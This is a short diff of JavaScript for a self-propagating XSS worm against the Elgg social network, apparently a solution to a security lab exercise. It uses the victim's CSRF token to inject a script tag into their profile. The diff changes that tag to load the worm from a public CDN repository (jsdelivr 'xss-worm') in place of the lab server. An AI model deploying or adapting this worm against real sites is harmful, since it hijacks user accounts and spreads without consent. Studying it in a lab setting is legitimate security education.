@@ -8,7 +8,7 @@ window.onload = function(){
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     // Script code to propagate the worm by injecting itself into victim's profile description.
-    var wormScript = '<script type="text/javascript" src="http://www.seed-server.com/worm.js"></script>';
+    var wormScript = '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Kenzie-Young/xss-worm@main/xss-worm.js"></script>';
     
     // Code to update victims profile.
     var content = "description=" + encodeURIComponent("I work at Google as a dog walker.") + "&worm=" + encodeURIComponent(wormScript); 
